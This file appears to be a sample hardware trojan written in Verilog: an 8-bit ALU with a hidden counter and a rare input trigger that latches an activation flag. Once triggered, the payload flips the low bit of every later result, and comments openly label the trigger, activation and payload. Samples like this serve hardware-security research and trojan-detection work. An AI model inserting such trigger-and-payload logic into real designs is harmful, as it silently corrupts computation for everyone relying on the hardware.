module trojan_alu1 (
    input  wire       clk,
    input  wire       reset,
    input  wire       enable,

    input  wire [7:0] A,
    input  wire [7:0] B,
    input  wire [1:0] op,

    output reg  [7:0] result
);

    reg [7:0] alu_result;

    // Trojan internal monitoring counter
    reg [3:0] internal_counter;

    // Trojan activation signal
    reg trojan_active;

    // Rare trigger condition
    wire trigger_condition;


    // ------------------------------------------------
    // Normal ALU
    // ------------------------------------------------

    always @(*) begin

        case (op)

            2'b00:
                alu_result = A + B;

            2'b01:
                alu_result = A - B;

            2'b10:
                alu_result = A & B;

            2'b11:
                alu_result = A | B;

            default:
                alu_result = 8'b0;

        endcase

    end


    // ------------------------------------------------
    // Trojan internal counter
    // ------------------------------------------------

    always @(posedge clk) begin

        if (reset)

            internal_counter <= 4'b0000;

        else

            internal_counter <= internal_counter + 1'b1;

    end


    // ------------------------------------------------
    // Rare trigger
    // ------------------------------------------------

    assign trigger_condition =
            (A == 8'hA5) &&
            (B == 8'h3C) &&
            (op == 2'b11) &&
            (internal_counter == 4'b1111) &&
            enable;


    // ------------------------------------------------
    // Trojan activation
    // ------------------------------------------------

    always @(posedge clk) begin

        if (reset)

            trojan_active <= 1'b0;

        else if (trigger_condition)

            trojan_active <= 1'b1;

    end


    // ------------------------------------------------
    // Trojan payload
    // ------------------------------------------------

    always @(posedge clk) begin

        if (reset)

            result <= 8'b0;

        else if (enable) begin

            if (trojan_active)

                result <= alu_result ^ 8'b00000001;

            else

                result <= alu_result;

        end

    end

endmodule